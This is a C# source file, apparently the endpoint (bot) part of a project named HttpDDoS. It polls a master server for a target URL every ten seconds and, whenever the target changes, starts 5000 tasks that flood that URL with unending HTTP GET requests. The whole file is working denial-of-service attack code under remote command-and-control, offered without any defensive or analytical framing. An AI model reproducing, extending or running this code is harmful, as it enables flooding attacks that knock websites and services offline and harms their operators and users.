using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Json;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using HttpDDoS.Shared;

namespace HttpDDoS.Endpoint
{
    class Program
    {
        const string master = "https://localhost:4914/Status";
        const int MaxRunningTasks = 5000;
        const int RefreshInterval = 10 * 1000;

        static async Task Main(string[] args)
        {
            Thread.Sleep(RefreshInterval);

            CancellationTokenSource tokenSrc = new();
            var http = new HttpClient();

            Status currStatus = null;

            while (true)
            {
                Console.WriteLine("Fetching Info From Master Server...");
                var newStatus = await http.GetFromJsonAsync<Status>(master);

                if (currStatus is null ||
                    JsonSerializer.Serialize(newStatus) != JsonSerializer.Serialize(currStatus))
                {
                    currStatus = newStatus;
                    tokenSrc.Cancel();
                    tokenSrc = new();
                    Enumerable.Range(1, MaxRunningTasks).ToList()
                        .ForEach(i =>
                            Task.Run(() => Attack(currStatus),
                            tokenSrc.Token));
                }

                Thread.Sleep(RefreshInterval);
            }
        }

        public static void Attack(Status status)
        {
            var http = new HttpClient();
            while (true)
            {
                _ = http.GetAsync(status.Url);
            }
        }
    }
}
